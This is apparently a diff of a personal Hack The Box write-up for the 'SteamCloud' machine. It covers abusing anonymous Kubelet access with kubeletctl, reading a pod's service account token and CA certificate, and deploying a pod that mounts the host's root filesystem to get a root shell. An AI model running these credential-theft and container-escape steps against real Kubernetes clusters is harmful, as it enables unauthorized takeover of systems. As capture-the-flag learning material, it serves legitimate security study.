@@ -1,17 +1,3 @@
----
-OS: 
-date: 20-06-2025
-Time Started: 09:35
-Time Ended: 14:09
-tags:
-  - Linux
-  - Easy
-  - HTB
----
-
-
-
-
 # Given
 
 SteamCloud is an easy difficulty machine. The port scan reveals that it has a bunch of Kubernetes specific ports open. We cannot not enumerate the Kubernetes API because it requires authentication. Now, as Kubelet allows anonymous access, we can extract a list of all the pods from the K8s cluster by enumerating the Kubelet service. Furthermore, we can get into one of the pods and obtain the keys necessary to authenticate into the Kubernetes API. We can now create and spawn a malicious pod and then use Kubectl to run commands within the pod to read the root flag.
@@ -34,6 +20,7 @@ Started with an nmap scan of all ports, `nmap -sCV -p- -T3 -oN enum/nmap.out` wh
 ```
 
 Googling the ports 2379, 2380 led me to finding out that they're from the Kubernetes service. 
+
 ![](../../Assets/Pasted%20image%2020250620111842.png)
 
 Checking Hacktricks for Kubernetes, and Kubelet API pentesting showed me how to interact with the Kubelet API. Managed to get some api endpoints which I should be able to normally.
@@ -52,7 +39,9 @@ Path("/containerLogs")
 ## Exploiting RCE
 
  `/run` and `/exec` allow us to run code remotely on the containers. An example of `RCE`. 
+
  
+
 The `kubeletctl` and `kubectl` binaries for interacting with the kubernetes api, and containers. 
 
 - Run `kubeletctl pods--server 10.10.11.13` to get a list of the pods running on the server.
@@ -85,6 +74,7 @@ kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/token" --names
 The idea here is that the kubernetes pods are running on a Linux Machine, and we want to essentially break out of the pod, and into the machine's file system.
 
 We can go about doing this by mounting the machine's file system to a kubernetes pod we create using `kubectl`, the `ca.crt` and `token` files.
+
 In order to create a pod, we'll also need a YAML file describing the pod in question.
 
 ```yaml
@@ -123,10 +113,13 @@ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.
 The YAML file specifies a mounted drive called `hostfs`, which has a path of `/` meaning it will map the host machine's root directory.
 
 We can check if this worked by using `kubeletctl` to list the pods running on the server.
+
 ![](../../Assets/Pasted%20image%2020250620145547.png)
+
 And now we can connect to our pod by issuing the following command
 
 `kubeletctl exec '/bin/sh' --server 10.10.11.133 -p 0ni-pod -c 0ni-pod`
+
 and we have a root shell.
 
 # Findings
@@ -164,4 +157,5 @@ Path("/containerLogs")
 # Proof
 
 ![](../../Assets/Pasted%20image%2020250620131859.png)
+
 ![](../../Assets/Pasted%20image%2020250620140707.png)
